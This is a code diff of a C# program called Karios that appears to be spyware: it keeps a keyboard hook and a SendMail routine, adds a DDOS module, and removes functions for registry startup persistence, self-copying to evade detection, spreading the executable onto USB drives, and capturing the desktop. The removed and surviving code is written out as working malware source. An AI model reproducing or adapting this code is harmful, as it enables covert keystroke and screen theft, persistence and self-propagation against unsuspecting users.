@@ -1,6 +1,4 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
 using System.Diagnostics;
@@ -9,16 +7,9 @@ using System.Runtime.InteropServices;
 using System.IO;
 using System.Net;
 using System.Net.Mail;
-using Microsoft.Win32;
-using System.Windows.Input;
-using System.Net.Sockets;
-using System.Drawing.Imaging;
 using System.Drawing;
-using System.Runtime.Remoting.Messaging;
-using System.Net.Mime;
 using System.Net.NetworkInformation;
-using System.Timers;
-using Timer = System.Windows.Forms.Timer;
+using Karios.DDOS;
 
 namespace Karios
 {
@@ -283,46 +274,6 @@ namespace Karios
             File.Delete(pathToLog);
             return CallNextHookEx(_hookId, nCode, wParam, lParam);
         }
-
-        public static void SetStartup()
-        {
-            //Changes the startup registary keys to run Karios at startup.
-            /*
-            RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
-            string pathToSecCopy = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\" + AppDomain.CurrentDomain.FriendlyName;
-            string pathToApp = Application.ExecutablePath;
-            if (rkApp.GetValue(System.AppDomain.CurrentDomain.FriendlyName) == null)
-            {
-                rkApp.SetValue(System.AppDomain.CurrentDomain.FriendlyName, pathToSecCopy);
-            }
-            */
-        }
-        public static void Duplicate()
-        {
-            //Copies itself into the startup multiple times to reduce getting found out
-            /*
-            if (Application.StartupPath != Environment.GetFolderPath(Environment.SpecialFolder.UserProfile))
-            {
-                System.IO.File.Copy(Application.StartupPath + @"\" + System.AppDomain.CurrentDomain.FriendlyName
-                                , Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\" + AppDomain.CurrentDomain.FriendlyName, true);
-            }
-            */
-        }
-        public static void USBSpread()
-        {
-            var alldrives = DriveInfo.GetDrives();
-
-            // Gets infomation about drives
-            foreach (DriveInfo d in alldrives)
-            {
-                if (d.DriveType == DriveType.Removable && d.IsReady)
-                {
-                    //Checks if they are removable, then adds Karios into the USB
-                    File.Copy(Application.StartupPath + @"\" + System.AppDomain.CurrentDomain.FriendlyName,
-                        d.Name + @"\" + System.AppDomain.CurrentDomain.FriendlyName, true);
-                }
-            }
-        }
         public static void SendMail()
         {
             try
@@ -388,35 +339,6 @@ namespace Karios
 
                 return null;
             }
-        }
-
-        public static void Ddos()
-        {
-            using (var wc = new WebClient())
-            {
-                try
-                {
-                }
-                catch
-                {
-                    // ignored
-                }
-            }
-        }
-
-        private static Image CaptureDesktop()
-        {
-            // Start the process...
-            var memoryImage = new Bitmap(1000, 900);
-            var s = new Size(memoryImage.Width, memoryImage.Height);
-
-            // Create graphics
-            var memoryGraphics = Graphics.FromImage(memoryImage);
-
-            // Copy data from screen
-            memoryGraphics.CopyFromScreen(0, 0, 0, 0, s);
-            // Save it!
-            return memoryImage;
         }
 
         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
